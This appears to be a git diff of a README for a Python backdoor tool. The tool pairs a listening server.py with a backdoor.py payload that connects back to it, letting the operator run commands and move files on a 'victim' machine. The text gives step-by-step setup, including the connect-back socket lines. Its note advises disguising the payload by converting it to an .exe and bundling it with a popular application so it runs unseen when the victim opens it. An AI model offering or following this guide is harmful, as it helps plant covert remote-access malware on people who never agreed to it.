@@ -18,10 +18,10 @@ This tool enables a backdoor connection between a client and a server, allowing 
   
 - **Server:** The server (server.py) listens for incoming client connections. Once connected, it allows you to send commands, upload files to the client, and download files from the client.
 
-##
+
 >**Note:** backdoor.py is a payload that needs to be executed by the target(victim). You can use various other techniques to make that possible.
-        (like converting backdoor.py to .exe and merging it with other mostly used application. So that when target opens the application then the backdoor will execute in background)**
-##
+        (like converting backdoor.py to .exe and merging it with other mostly used application. So that when target opens the application then the backdoor will execute in background)
+
 
 ### Usage
 
@@ -29,28 +29,43 @@ This tool enables a backdoor connection between a client and a server, allowing 
 
 1. Clone the repository:
    
-   git clone https://github.com/Vaibhav256/Cybersecurity_Tools/Local_Backdoor_Access
-   cd Local_Backdoor_Access
+   git clone https://github.com/Vaibhav256/Cybersecurity_Tools/local-backdoor-access
 
-2. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
-    ## not a command
+2. Change to directory:
+
+   cd local-backdoor-access
+
+3. Open server.py file:
+
+    nano server.py
+
+4. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
+    *(not a command)*
     make changes in the line no. 57 --> default: sock.bind(('0.0.0.0', 5555))
 
-3. Run the Server:
+5. Run the Server:
 
     python server.py
 
 #### Setting Up the Backdoor (Target)
 
-1. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
-    # not a command
+1. Change to directory:
+
+   cd local-backdoor-access
+
+2. Open backdoor.py file:
+
+    nano backdoor.py
+
+3. Edit the ip address and port number according to your network: [Enter the Server's ip address and port]
+    *(not a command)*
     make changes in the line no. 24 --> default: sock1.connect(('0.0.0.0', 5555))
 
-2. Run the Backdoor or make it execute.
-    # if your are checking a demo on your own another device then you may run it like:
+4. Run the Backdoor or make it execute.
+    *if your are checking a demo on your own another device then you may run it like:*
         python backdoor.py 
-    # you must have backdoor.py file and python installed on that device**
-    # OR you can convert py to executable then python is not necessary to be installed on that device.
+    *you must have backdoor.py file and python installed on that device*
+    *OR you can convert py to executable then python is not necessary to be installed on that device.*
 
 ### Commands to use (After connection)
 
